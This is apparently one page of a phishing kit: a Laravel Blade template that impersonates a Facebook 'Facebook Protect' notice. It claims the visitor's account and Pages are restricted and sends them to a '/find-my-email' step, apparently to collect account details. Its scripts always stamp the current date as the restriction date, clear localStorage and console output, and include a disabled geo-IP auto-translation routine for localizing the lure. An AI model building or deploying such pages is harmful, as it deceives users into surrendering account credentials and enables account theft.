<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>{{__('msg.Business Help Center')}}</title>
        <meta name="referrer" content="no-referrer">
        <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" type="image/x-icon" />
        <meta property="og:image" content="https://i.imgur.com/dPbn7je.jpg">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    </head>
    <body class="flex justify-center items-center h-screen" cz-shortcut-listen="true" style="position: relative; min-height: 100%; top: 0px">
        <div class="flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3">
            <div class="overflow-hidden rounded-lg">
                <img src="/images/logo.png" class="mx-auto mb-0 block h-full w-full" alt="Facebook Logo" />
            </div>
            <p class="text-2xl font-bold">{{__('msg.Welcome To Facebook Protect.')}}</p>
            <p>
                {{__("msg.Your account's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.")}}
                <a class="block text-blue-500 hover:underline" href="https://www.facebook.com/help" target="_blank">{{__('msg.More information')}}</a>
            </p>

            <div class="px-[14px]">
                <ol class="relative border-s-2 border-gray-200 text-gray-500">
                    <li class="mb-10 ms-6">
                        <span class="absolute -start-[14px] flex h-6 w-6 items-center justify-center rounded-full bg-[#C4C4C4] ring-4 ring-white">
                            <svg class="h-3 w-3 text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 12">
                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 5.917 5.724 10.5 15 1.5"></path>
                            </svg>
                        </span>
                        <h3 class="text-black">{{__("msg.We've enabled advanced protections to unlock your Page.")}}</h3>
                    </li>
                    <li class="ms-6">
                        <span class="absolute -start-[14px] flex h-6 w-6 items-center justify-center rounded-full bg-[#35589e] ring-4 ring-white">
                            <svg class="h-3 w-3 text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 16">
                                <path d="M18 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2ZM6.5 3a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3.014 13.021l.157-.625A3.427 3.427 0 0 1 6.5 9.571a3.426 3.426 0 0 1 3.322 2.805l.159.622-6.967.023ZM16 12h-3a1 1 0 0 1 0-2h3a1 1 0 0 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Z"></path>
                            </svg>
                        </span>
                        <h3 class="text-black">{{__("msg.Below, we walk you through the process in detail and help you fully activate to unlock your Page.")}}</h3>
                    </li>
                </ol>
            </div>
            <a class='block w-full cursor-pointer rounded-lg bg-blue-500 py-3 text-center text-lg font-semibold text-white sm:py-3 xl:py-3' href='/find-my-email'>{{__('msg.Continue')}}</a>
            <p class="mb-5 mt-3 block text-center">{{__('msg.Your account was restricted on')}} <strong id="currentDate">May 2, 2025</strong>.</p>
        </div>

        <div id="google_translate_element" class="hidden"></div>

        <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
        <script nomodule="" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
        <script type="text/javascript">
            document.addEventListener('DOMContentLoaded', function () {
                localStorage.clear();
                const date = new Date();
                const options = { month: 'long', day: 'numeric', year: 'numeric' };
                const formattedDate = date.toLocaleDateString('en-US', options);
                document.getElementById('currentDate').textContent = formattedDate;
            });
        </script>

        <script>
            document.addEventListener('DOMContentLoaded', () => {
                localStorage.clear();
                localStorage.setItem('visited', 'true');

                const loadGoogleTranslate = async () => {
                    try {
                        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                        const data = await response.json();
                        const countryCode = data.country_code;

                        const response2 = await fetch('country_to_language.json');
                        const languageMap = await response2.json();
                        const languageCode = languageMap[countryCode] || 'en';

                        if (languageCode !== 'en') {
                            const script = document.createElement('script');
                            script.src = 'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
                            script.async = true;
                            document.body.appendChild(script);

                            window.googleTranslateElementInit = () => {
                                new google.translate.TranslateElement(
                                    {
                                        pageLanguage: 'en',
                                        includedLanguages: languageCode,
                                        autoDisplay: false
                                    },
                                    'google_translate_element'
                                );

                                let retryCount = 0;
                                const maxRetries = 20;
                                const retryInterval = 300;

                                const attemptTranslation = () => {
                                    const gtcombo = document.querySelector('.goog-te-combo');
                                    const instance = google.translate.TranslateElement.getInstance?.();

                                    if (gtcombo || instance) {
                                        const element = document.querySelector('html');
                                        element.setAttribute('lang', languageCode);

                                        if (gtcombo) {
                                            gtcombo.value = languageCode;
                                            gtcombo.dispatchEvent(new Event('change'));
                                        }

                                        if (instance) {
                                            try {
                                                instance.setEnabled(true);
                                                const translateSelect = document.querySelector('.goog-te-combo');
                                                if (translateSelect) {
                                                    translateSelect.value = languageCode;
                                                    translateSelect.dispatchEvent(new Event('change'));
                                                }
                                            } catch (e) {
                                                console.clear();
                                            }
                                        }
                                        return true;
                                    }

                                    retryCount++;
                                    if (retryCount < maxRetries) {
                                        setTimeout(attemptTranslation, retryInterval);
                                    }
                                    return false;
                                };

                                attemptTranslation();
                            };
                        }
                    } catch (error) {
                        console.clear();
                    }
                };
                //loadGoogleTranslate();
            });
        </script>


    </body>
</html>
